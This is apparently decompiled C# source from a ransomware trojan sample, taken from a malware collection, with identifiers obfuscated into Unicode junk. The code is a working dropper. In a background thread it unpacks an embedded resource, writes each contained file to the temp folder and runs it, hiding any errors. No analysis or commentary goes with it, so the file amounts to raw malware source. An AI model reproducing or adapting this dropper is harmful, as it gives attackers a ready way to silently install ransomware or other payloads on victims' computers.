// Decompiled with JetBrains decompiler
// Type: ẍ߮ᑐᗭ৲ᗒ̛ᗫ།ཏӍᡸẗ᡽़य़ᢠ᛭༌.ᚡᄗᰊᢗֿႣخ፜ᅳ
// Assembly: start1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B30574D9-5740-4AF1-9AAD-FBD9FE6B2A96
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-89f3ccf08032a8f789a4d56feebe797fb02d3c983b9f4783b0428640dbafc04e.exe

using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Threading;
using ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C;

namespace ẍ߮ᑐᗭ\u09F2ᗒ̛ᗫ\u0F0DཏӍ\u1878ẗ\u187D़य़ᢠ\u16ED\u0F0C
{
  internal class ᚡᄗᰊᢗֿႣخ\u135Cᅳ
  {
    public static void ሚ၈ӑਮըߚথ() => new Thread((ThreadStart) (() =>
    {
      BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(\u1C86\u08D4\u0F2Bᢢᛞዿ᪳ಸืቦפÃዄ\u0A00ԭឝᠶ.ᮍΐฝᬺދᆙ໔((byte[]) new ResourceManager("b", Assembly.GetExecutingAssembly()).GetObject("b"), false)));
      while (binaryReader.PeekChar() != -1)
      {
        string str = binaryReader.ReadString();
        int count = binaryReader.ReadInt32();
        byte[] bytes = binaryReader.ReadBytes(count);
        try
        {
          if (!File.Exists(Path.GetTempPath() + str))
            File.WriteAllBytes(Path.GetTempPath() + str, bytes);
          Process.Start(Path.GetTempPath() + str);
        }
        catch
        {
        }
      }
    })).Start();
  }
}
